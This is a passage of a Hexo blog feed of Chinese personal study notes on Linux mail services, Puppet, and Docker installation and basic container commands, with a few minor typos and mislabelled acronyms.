命令用于检查主配置文件中的语法或参数的错误。</p><p><code>named-checkzone</code> 命令用于检查数据配置文件中的语法或参数错误。</p><h1 id="第15章-使用-Postfix-与-Dovecot-部署邮件系统"><a href="#第15章-使用-Postfix-与-Dovecot-部署邮件系统" class="headerlink" title="第15章 使用 Postfix 与 Dovecot 部署邮件系统"></a>第15章 使用 Postfix 与 Dovecot 部署邮件系统</h1><h2 id="15-1-电子邮件系统"><a href="#15-1-电子邮件系统" class="headerlink" title="15.1 电子邮件系统"></a>15.1 电子邮件系统</h2><p>使用 “姓名@计算机主机名称” 的格式来规范电子信箱的名称.</p><p>电子邮件系统基于邮件协议来完成电子邮箱的传输.</p><p>常见的邮箱协议:</p><ul><li>Simple Mail Transfer Protocol, SMTP, 用于发送和中转的电子邮件，占用服务器的 TCP&#x2F;25 端口</li><li>Post Office Protocol 3, 用于将电子邮件存储到本地主机，占用服务器的 TCP&#x2F;110 端口</li><li>Internet Message Access Protocol 4, 用于在本地主机访问邮件，占用服务器的 TCP&#x2F;143 端口</li></ul><p>在电子邮件系统中，为用户收发邮件的服务器名为<mark>邮件用户代理</mark>(Main User Agent) 即 MUA.</p><p>用于保存用户邮件的”信箱”服务器叫<mark>邮件投递代理</mark>(Mail Transfer Agent) 即 MDA. 其将<mark>邮件传输代理</mark>(Mail Transfer Agent) 即 MTA 的邮件保存在本地。</p><p>部署邮件系统需注意:</p><ul><li>添加反垃圾和反病毒模块</li><li>对邮件加密</li><li>添加邮件监控审核模块</li><li>保障稳定性</li></ul><h2 id="15-2-部署基础的电子邮件系统"><a href="#15-2-部署基础的电子邮件系统" class="headerlink" title="15.2 部署基础的电子邮件系统"></a>15.2 部署基础的电子邮件系统</h2><h3 id="15-1-2-配置-Postfix-服务程序"><a href="#15-1-2-配置-Postfix-服务程序" class="headerlink" title="15.1.2 配置 Postfix 服务程序"></a>15.1.2 配置 Postfix 服务程序</h3>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在 Ubuntu 容器中下载 ip 等命令</title>
    <link href="/2022/08/25/%E5%9C%A8-Ubuntu-%E5%AE%B9%E5%99%A8%E4%B8%AD%E4%B8%8B%E8%BD%BD-ip-%E7%AD%89%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/08/25/%E5%9C%A8-Ubuntu-%E5%AE%B9%E5%99%A8%E4%B8%AD%E4%B8%8B%E8%BD%BD-ip-%E7%AD%89%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update<br>apt-<span class="hljs-built_in">get</span> install net-tools iputils-ping iproute2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Puppet, Chef 工具</title>
    <link href="/2022/08/25/Puppet-Chef-%E5%B7%A5%E5%85%B7/"/>
    <url>/2022/08/25/Puppet-Chef-%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>puppet 使用自有的 puppet 描述语言，可管理配置文件、用户、cron任务、软件包、系统服务等.</p><p>puppet 采用 Client&#x2F;Server 结构，所有客户端和一个或几个服务器交互。每个客户端周期性(默认为半个小时)向服务器发送请求，获得其最新的配置信息，保证和该配置信息同步。配置完成后，puppet 客户端可以反馈给服务器端一个消息。</p><h1 id="运行模式"><a href="#运行模式" class="headerlink" title="运行模式"></a>运行模式</h1><p>有两种运行模式:</p><ul><li>standalone 模式: 在单台服务器上制定规则，只能在单台服务器上运行</li><li>master&#x2F;agent 模式: master 制定规则，可以推送到多台 agent 服务器上运行</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 工具 strace, perf, 和 /proc</title>
    <link href="/2022/08/25/Linux-%E5%B7%A5%E5%85%B7-strace-perf-%E5%92%8C-proc/"/>
    <url>/2022/08/25/Linux-%E5%B7%A5%E5%85%B7-strace-perf-%E5%92%8C-proc/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第一本 Docker 书</title>
    <link href="/2022/08/25/%E7%AC%AC%E4%B8%80%E6%9C%AC-Docker-%E4%B9%A6/"/>
    <url>/2022/08/25/%E7%AC%AC%E4%B8%80%E6%9C%AC-Docker-%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="第1章-简介"><a href="#第1章-简介" class="headerlink" title="第1章 简介"></a>第1章 简介</h1><p>容器(container) 和 管理程序虚拟化(hypervisor virtualization) 不同:</p><ul><li>HV, 通过中间层将一台或多台独立的机器虚拟运行于物理硬件之上</li><li>Container, 直接运行在操作系统内核之上的用户空间</li></ul><p>容器只能运行与底层宿主机相同或相似的操作系统。</p><p>Docker 是为改变容器的复杂性。</p><h2 id="1-1-Docker-简介"><a href="#1-1-Docker-简介" class="headerlink" title="1.1 Docker 简介"></a>1.1 Docker 简介</h2><p>Docker 是一个能够把开发的应用程序自动部署到容器的开源引擎。所以说是和容器相关联。</p><p>Docker 在虚拟化的容器执行环境中增加了一个应用程序部署引擎。</p><h3 id="1-1-1-提供一个简单、轻量的建模方式"><a href="#1-1-1-提供一个简单、轻量的建模方式" class="headerlink" title="1.1.1 提供一个简单、轻量的建模方式"></a>1.1.1 提供一个简单、轻量的建模方式</h3><p>Docker 依赖于”写时复制”模型。</p><h3 id="1-1-2-职责的逻辑分离"><a href="#1-1-2-职责的逻辑分离" class="headerlink" title="1.1.2 职责的逻辑分离"></a>1.1.2 职责的逻辑分离</h3><h3 id="1-1-3-快速、高效的开发生命周期"><a href="#1-1-3-快速、高效的开发生命周期" class="headerlink" title="1.1.3 快速、高效的开发生命周期"></a>1.1.3 快速、高效的开发生命周期</h3><h3 id="1-1-4-鼓励使用面向服务的架构"><a href="#1-1-4-鼓励使用面向服务的架构" class="headerlink" title="1.1.4 鼓励使用面向服务的架构"></a>1.1.4 鼓励使用面向服务的架构</h3><h2 id="1-2-Docker-组件"><a href="#1-2-Docker-组件" class="headerlink" title="1.2 Docker 组件"></a>1.2 Docker 组件</h2><p>核心组件:</p><ul><li>Docker 客户端和服务器，也称为 Docker 引擎</li><li>Docker 镜像</li><li>Registry</li><li>Docker 容器</li></ul><h3 id="1-2-1-Docker-客户端和服务器"><a href="#1-2-1-Docker-客户端和服务器" class="headerlink" title="1.2.1 Docker 客户端和服务器"></a>1.2.1 Docker 客户端和服务器</h3><p>Docker 是一个客户端&#x2F;服务器(C&#x2F;S)架构的程序。</p><p>Docker 提供了一个命令行工具 docker 以及一整套 RESTFUL API 来与守护进程交互。</p><h3 id="1-2-2-Docker-镜像"><a href="#1-2-2-Docker-镜像" class="headerlink" title="1.2.2 Docker 镜像"></a>1.2.2 Docker 镜像</h3><p>用户基于镜像来运行自己的容器。</p><p>可以把镜像当做容器的”源代码”.</p><h3 id="1-2-3-Registry"><a href="#1-2-3-Registry" class="headerlink" title="1.2.3 Registry"></a>1.2.3 Registry</h3><p>Docker 用 Registry 来保存用户构建的镜像。</p><p>Registry 分为公有和私有两种。</p><p>可在 Docker Hub 上保存自己的私有镜像。</p><h3 id="1-2-4-容器"><a href="#1-2-4-容器" class="headerlink" title="1.2.4 容器"></a>1.2.4 容器</h3><p>Docker 可以帮用户构建和部署容器，用户只需要把自己的应用程序或服务打包放进容器即可。</p><p>Docker 容器是:</p><ul><li>一个镜像格式</li><li>一系列标准的操作</li><li>一个执行环境</li></ul><p>Docker 借鉴了集装箱的概念，集装箱运输货物，Docker 运输软件。Docker 是运输工, 对容器进行操作。</p><p>每个容器都包含一个软件镜像，也就是容器的”货物”.</p><p>所有容器都按照相同的方式将内容”装载”进去，</p><h2 id="1-3-能用-Docker-做什么"><a href="#1-3-能用-Docker-做什么" class="headerlink" title="1.3 能用 Docker 做什么"></a>1.3 能用 Docker 做什么</h2><p>容器可以为各种测试提供很好的沙盒环境.</p><h2 id="1-4-Docker-与配置管理"><a href="#1-4-Docker-与配置管理" class="headerlink" title="1.4 Docker 与配置管理"></a>1.4 Docker 与配置管理</h2><p>Docker 很轻量: 镜像是分层的，可以对其进行迅速的迭代.</p><p>Docker 一个显著特点就是，对不同的宿主机、应用程序和服务，可能会表现出不同的特性与架构。</p><h2 id="1-5-Docker-的技术组件"><a href="#1-5-Docker-的技术组件" class="headerlink" title="1.5 Docker 的技术组件"></a>1.5 Docker 的技术组件</h2><h1 id="第2章-安装-Docker"><a href="#第2章-安装-Docker" class="headerlink" title="第2章 安装 Docker"></a>第2章 安装 Docker</h1><h2 id="2-1-安装-Docker-的先决条件"><a href="#2-1-安装-Docker-的先决条件" class="headerlink" title="2.1 安装 Docker 的先决条件"></a>2.1 安装 Docker 的先决条件</h2><h2 id="2-2-在-Ubuntu-和-Debian-中安装-Docker"><a href="#2-2-在-Ubuntu-和-Debian-中安装-Docker" class="headerlink" title="2.2 在 Ubuntu 和 Debian 中安装 Docker"></a>2.2 在 Ubuntu 和 Debian 中安装 Docker</h2><h3 id="2-2-1-检查前提条件"><a href="#2-2-1-检查前提条件" class="headerlink" title="2.2.1 检查前提条件"></a>2.2.1 检查前提条件</h3><h4 id="1-内核"><a href="#1-内核" class="headerlink" title="1. 内核"></a>1. 内核</h4><p>使用:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">uname</span> -a</span><br></code></pre></td></tr></table></figure><p>若下载新内核，可使用命令加载新内核:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo <span class="hljs-built_in">update-grub</span><br><span class="hljs-variable">$</span> reboot<br></code></pre></td></tr></table></figure><h4 id="2-检查-Device-Mapper"><a href="#2-检查-Device-Mapper" class="headerlink" title="2. 检查 Device Mapper"></a>2. 检查 Device Mapper</h4><p>使用 Device Mapper 作为存储驱动。</p><p>Device Mapper 支持”自动精简配置”(thin-provisioning)的概念，可以在一种文件系统中存储多台虚拟设备(Docker镜像中的层).</p><p>确认是否安装:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ ls -l <span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/misc/</span>device-mapper<br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ sudo <span class="hljs-keyword">grep</span> device-mapper <span class="hljs-regexp">/proc/</span>devices<br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo modprobe dm_mod<br></code></pre></td></tr></table></figure><h3 id="2-2-2-安装-Docker"><a href="#2-2-2-安装-Docker" class="headerlink" title="2.2.2 安装 Docker"></a>2.2.2 安装 Docker</h3><p>到<a href="https://docs.docker.com/engine/install/ubuntu/">官网</a>查看.</p><h3 id="2-2-3-Docker-与-UFW"><a href="#2-2-3-Docker-与-UFW" class="headerlink" title="2.2.3 Docker 与 UFW"></a>2.2.3 Docker 与 UFW</h3><p>UWF 即 Uncomplicated Firewall.</p><p>Docker 使用一个网桥来管理容器中的网络。</p><p>默认情况下，UFW 会丢弃所有转发的数据包，因此需要在 UFW 中启用数据包的转发.</p><p>修改 <code>/etc/default/ufw</code> 文件:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">DEFAULT_FORWARD_POLICY</span>=<span class="hljs-string">&quot;DROP&quot;</span><br></code></pre></td></tr></table></figure><p>改为:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">DEFAULT_FORWARD_POLICY</span>=<span class="hljs-string">&quot;ACCEPT&quot;</span><br></code></pre></td></tr></table></figure><p>重新加载:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo ufw reload<br></code></pre></td></tr></table></figure><h2 id="2-9-Docker-守护进程"><a href="#2-9-Docker-守护进程" class="headerlink" title="2.9 Docker 守护进程"></a>2.9 Docker 守护进程</h2><p>用户可以使用 <code>docker daemon</code> 命令控制 Docker 守护进程。</p><p>守护进程监听 <code>/var/run/docker.sock</code> 这个 UNIX套接字文件，来获取来自客户端的 Docker 请求。</p><h3 id="2-9-1-配置-Docker-守护进程"><a href="#2-9-1-配置-Docker-守护进程" class="headerlink" title="2.9.1 配置 Docker 守护进程"></a>2.9.1 配置 Docker 守护进程</h3><p>用 <code>-H</code> 标志调整守护进程绑定监听接口的方式, 可以使用 <code>-H</code> 标志指定不同的网络接口和端口配置:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker daemon -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span><br></code></pre></td></tr></table></figure><p>使用 <code>-D</code> 参数来输出 Docker 守护进程的详细信息:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker daemon -D<br></code></pre></td></tr></table></figure><h2 id="2-10-升级-Docker"><a href="#2-10-升级-Docker" class="headerlink" title="2.10 升级 Docker"></a>2.10 升级 Docker</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo apt-<span class="hljs-built_in">get</span> update<br>$ sudo apt-<span class="hljs-built_in">get</span> install docker-engine<br></code></pre></td></tr></table></figure><h2 id="2-11-Docker-用户界面"><a href="#2-11-Docker-用户界面" class="headerlink" title="2.11 Docker 用户界面"></a>2.11 Docker 用户界面</h2><h1 id="第3章-Docker-入门"><a href="#第3章-Docker-入门" class="headerlink" title="第3章 Docker 入门"></a>第3章 Docker 入门</h1><h2 id="3-1-确保-Docker-已经就绪"><a href="#3-1-确保-Docker-已经就绪" class="headerlink" title="3.1 确保 Docker 已经就绪"></a>3.1 确保 Docker 已经就绪</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">$ sudo docker <span class="hljs-meta">info</span><br></code></pre></td></tr></table></figure><h2 id="3-2-运行我们的第一个容器"><a href="#3-2-运行我们的第一个容器" class="headerlink" title="3.2 运行我们的第一个容器"></a>3.2 运行我们的第一个容器</h2><p><code>docker run</code> 命令提供了 Docker 容器的创建到启动的功能。</p><p>可以使用 <code>docker help run</code> 获取命令列表。</p><p>使用 <code>man</code> 页, <code>man docker-run</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -i -t ubuntu <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p><code>-i</code> 参数保证容器中 STDIN 是开启的。</p><p><code>-t</code> 参数告诉 Docker 为要创建的容器分配一个伪 tty 终端.</p><p><code>ubuntu</code> 是用来告诉 Docker 基于什么镜像来创建容器，<code>ubuntu</code> 镜像是一个常备镜像，也可以称为”基础”(base) 镜像，由 Docker 公司提供，保存在 Docker Hub Registry 上。</p><p>Docker 会检查本地是否存在 <code>ubuntu</code> 镜像，如果没有，Docker 就会连接官方维护的 Docker Hub Registry, 查看 Docker Hub 中是否存在该镜像，Docker 一旦找到该镜像，就会下载到本地。</p><p>随后，Docker 在文件系统内部用这个镜像创建了一个新容器，该容器拥有自己的 网络、IP地址，以及一个用来和宿主机进行通信的桥接网络接口。</p><p><code>/bin/bash</code> 是我们告诉 Docker 在容器中运行的命令。</p><h2 id="3-3-使用第一个容器"><a href="#3-3-使用第一个容器" class="headerlink" title="3.3 使用第一个容器"></a>3.3 使用第一个容器</h2><p>我进入的界面为:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@895508d7a56f</span><span class="hljs-symbol">:/</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>这里 <code>root</code> 为 root 账户，<code>895508d7a56f</code> 为容器 ID(即主机名). 其为一个完整的 Ubuntu 系统。</p><p>获取主机名:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@895508d7a56f</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># hostname</span><br></code></pre></td></tr></table></figure><p>查看容器的网络配置:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@895508d7a56f</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># ip a</span><br></code></pre></td></tr></table></figure><p>使用 <code>exit</code> 命令可以退出容器。</p><p><code>docker ps -a</code> 查看当前系统中容器的列表。</p><p><code>docker ps -l</code> 列出最后一个运行的容器。</p><p>有三种方式可以唯一指定容器:</p><ul><li>短 UUID</li><li>长 UUID</li><li>名称</li></ul><h2 id="3-4-容器命名"><a href="#3-4-容器命名" class="headerlink" title="3.4 容器命名"></a>3.4 容器命名</h2><p>Docker 会为我们创建的每一个容器自动生成一个随机的名称。</p><p>使用 <code>--name</code> 标志来指定名称:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ sudo doker <span class="hljs-built_in">run</span> <span class="hljs-comment">--name bob_the_container -i -t ubuntu /bin/bash</span><br></code></pre></td></tr></table></figure><p>一个合法的名称只能包括 <code>[a-zA-Z0-9.-]</code></p><p>很多 Docker 命令中，都可以用容器的名称来替代容器 ID.</p><p>容器的命名是唯一的。</p><p>用 <code>docker rm</code> 可删掉容器。</p><h2 id="3-5-重新启动已经停止的容器"><a href="#3-5-重新启动已经停止的容器" class="headerlink" title="3.5 重新启动已经停止的容器"></a>3.5 重新启动已经停止的容器</h2><p>启动停止的容器:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">start</span> bob_the_container <span class="hljs-comment"># 也可以使用容器 ID</span><br></code></pre></td></tr></table></figure><p>重新启动用 <code>docker restart</code></p><p>使用 <code>docker create</code> 创建一个容器但不运行它.</p><h2 id="3-6-附着到容器上"><a href="#3-6-附着到容器上" class="headerlink" title="3.6 附着到容器上"></a>3.6 附着到容器上</h2><p>Docker 容器重新启动的时候，会沿用 <code>docker run</code> 命令时指定的参数来运行。</p><p>也可以用 <code>docker attach</code> 命令重新附着到该容器的会话上:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo docker attach bob_the_container<br></code></pre></td></tr></table></figure><h2 id="3-7-创建守护式容器"><a href="#3-7-创建守护式容器" class="headerlink" title="3.7 创建守护式容器"></a>3.7 创建守护式容器</h2><p>除交互式运行的容器(interactive container) 还有守护式容器(daemonized container), 其没有交互式会话。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run --name daemon_dave -d ubuntu <span class="hljs-regexp">/bin/</span>sh -c <span class="hljs-string">&quot;while true; do echo hello world; sleep 1; done&quot;</span><br></code></pre></td></tr></table></figure><p>使用 <code>-d</code> 参数，即放入后台运行。</p><h2 id="3-8-容器内部都在干些什么"><a href="#3-8-容器内部都在干些什么" class="headerlink" title="3.8 容器内部都在干些什么"></a>3.8 容器内部都在干些什么</h2><p>使用 <code>docker logs</code> 获取容器的日志.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker logs daemon_dave<br></code></pre></td></tr></table></figure><p>可加入 <code>-f</code> 选项:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker logs <span class="hljs-operator">-f</span> daemon_dave<br></code></pre></td></tr></table></figure><p>获取最后十行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker logs --<span class="hljs-built_in">tail</span> 10 daemon_dave</span><br></code></pre></td></tr></table></figure><p>加上时间戳:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker logs -ft daemon_dave<br></code></pre></td></tr></table></figure><h2 id="3-9-Docker-日志驱动"><a href="#3-9-Docker-日志驱动" class="headerlink" title="3.9 Docker 日志驱动"></a>3.9 Docker 日志驱动</h2><p>使用 <code>--log-drive</code> 选项:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ sudo docker run <span class="hljs-params">--log-driver=</span><span class="hljs-string">&quot;syslog&quot;</span> <span class="hljs-params">--name</span> daemon_dwayne -d ubuntu <span class="hljs-string">/bash/sh</span> -c <span class="hljs-string">&quot;while true; do echo hello world; sleep 1; done&quot;</span><br></code></pre></td></tr></table></figure><p>使用 <code>syslog</code> 时会警用 <code>docker logs</code> 命令，并将所有容器的日志输出都重定向到 <code>Syslog</code>.</p><p>若使用 <code>none</code> 则禁用日志。</p><h2 id="3-10-查看容器内的进程"><a href="#3-10-查看容器内的进程" class="headerlink" title="3.10 查看容器内的进程"></a>3.10 查看容器内的进程</h2><p>使用 <code>docker top</code> 命令:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">$ sudo docker <span class="hljs-built_in">top</span> daemon_dave<br></code></pre></td></tr></table></figure><h2 id="3-11-Docker-统计信息"><a href="#3-11-Docker-统计信息" class="headerlink" title="3.11 Docker 统计信息"></a>3.11 Docker 统计信息</h2><p><code>docker stats</code> 显示一个或多个容器的统计信息:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker stats daemon_dave daemon_kate daemon_clare<br></code></pre></td></tr></table></figure><h2 id="3-12-在容器内部运行进程"><a href="#3-12-在容器内部运行进程" class="headerlink" title="3.12 在容器内部运行进程"></a>3.12 在容器内部运行进程</h2><p>可以再容器内运行的进程有两种类型:</p><ul><li>后台任务</li><li>交互式任务</li></ul><p>使用 <code>docker exec</code> 命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker <span class="hljs-built_in">exec</span> -d daemon_dave <span class="hljs-built_in">touch</span> /etc/new_config_file</span><br></code></pre></td></tr></table></figure><p>就是对一个正在运行的容器使用。</p><h2 id="3-13-停止守护式容器"><a href="#3-13-停止守护式容器" class="headerlink" title="3.13 停止守护式容器"></a>3.13 停止守护式容器</h2><p>使用 <code>docker stop</code> 命令:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo docker stop daemon_dave<br></code></pre></td></tr></table></figure><p>交互式可以通过 <code>exit</code></p><p>想要快速停止某个容器，使用 <code>docker kill</code>:</p><p>显示最后 x 个容器:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-n</span> x<br></code></pre></td></tr></table></figure><h2 id="3-14-自动重启容器"><a href="#3-14-自动重启容器" class="headerlink" title="3.14 自动重启容器"></a>3.14 自动重启容器</h2><p>使用 <code>--restart</code> 标志，磨人的行为是 Docker 不会重启容器。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo docker <span class="hljs-built_in">run</span> <span class="hljs-attribute">--restart</span>=always --name <br></code></pre></td></tr></table></figure><p>另一个 <code>on-failure</code> 参数，即在退出状态码为非 0 值时重启，且可指定重启次数:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--restart</span>=<span class="hljs-literal">on</span>-failure:<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h2 id="3-15-深入容器"><a href="#3-15-深入容器" class="headerlink" title="3.15 深入容器"></a>3.15 深入容器</h2><p><code>docker inspect</code> 获取更多容器信息:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker inspect daemon_dave<br></code></pre></td></tr></table></figure><p>使用 <code>-f</code> 或 <code>--format</code> 标志选定查看结果:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">$ sudo docker inspect --format=&#x27;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">.State.Running</span> &#125;&#125;</span><span class="language-xml">&#x27; daemon_dave</span><br></code></pre></td></tr></table></figure><p>可指定多个容器.</p><h2 id="3-16-删除容器"><a href="#3-16-删除容器" class="headerlink" title="3.16 删除容器"></a>3.16 删除容器</h2><p>使用 <code>docker rm</code> 命令:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">rm</span> <span class="hljs-number">80430</span>f8d0921<br></code></pre></td></tr></table></figure><p>可传递 <code>-f</code> 参数。</p><p>删除所有容器:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">rm</span> `sudo docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-a</span> <span class="hljs-literal">-q</span>`<br></code></pre></td></tr></table></figure><h1 id="第4章-使用-Docker-镜像和仓库"><a href="#第4章-使用-Docker-镜像和仓库" class="headerlink" title="第4章 使用 Docker 镜像和仓库"></a>第4章 使用 Docker 镜像和仓库</h1><h2 id="4-1-什么是-Docker-镜像"><a href="#4-1-什么是-Docker-镜像" class="headerlink" title="4.1 什么是 Docker 镜像"></a>4.1 什么是 Docker 镜像</h2><p>Docker 镜像是由文件系统叠加而成。</p><p>最低端是一个引导文件系统 bootfs.</p><p>当一个容器启动后，它会被移到内存中，而引导文件系统则会被卸载(unmount).</p><p>Docker 镜像的第二层是 root 文件系统 rootfs, 其位于引导文件系统之上。</p><p>Docker 利用联合加载技术(union mount), 即一次同时加载多个文件系统，但是在外面看起来只能看到一个文件系统。</p><p>联合加载会将各层文件系统叠加到一起，这样最终的文件系统会包含所有底层的文件和目录。</p><p>Docker 将这样的文件系统称为镜像。一个镜像可以放到另一个镜像的顶部。位于下面的镜像称为父镜像(parent image), 最底层的镜像称为基础镜像(base image).</p><p>当从一个镜像启动容器时，Docker 会在该镜像最顶层加载一个读写文件系统，我们在 Docke 中运行的程序就是在这个读写层中执行。</p><p>每个只读镜像层都是只读，并且以后永远不会变化。</p><p>写时复制(copy on write)机制，想修改一个文件，这个文件首先会从该读写层下面的只读层复制到该读写层，该文件的只读版本依然存在，但是被读写层中的该文件副本所隐藏。</p><h2 id="4-2-列出镜像"><a href="#4-2-列出镜像" class="headerlink" title="4.2 列出镜像"></a>4.2 列出镜像</h2><p>列出主机上可用的镜像, 使用 <code>docker images</code>:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker images<br></code></pre></td></tr></table></figure><p>本地镜像都保存在 Docker 宿主机的 <code>/ver/lib/docker</code> 目录下.</p><p>镜像从仓库下载，镜像保存在仓库中，仓库存在于 Registry 中。</p><p>每个镜像仓库都可以存放很多镜像.</p><p>使用 <code>docker pull</code> 命令来拉取仓库中的镜像。</p><p>可以通过在仓库名后面加上一个冒号和标签名来指定该仓库中的某一镜像:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ sudo docker <span class="hljs-built_in">run</span> -t -i <span class="hljs-comment">--name new_container ubuntu:12.04 /bin/bash</span><br></code></pre></td></tr></table></figure><p>一个镜像可以有多个标签。</p><p>Docker Hub 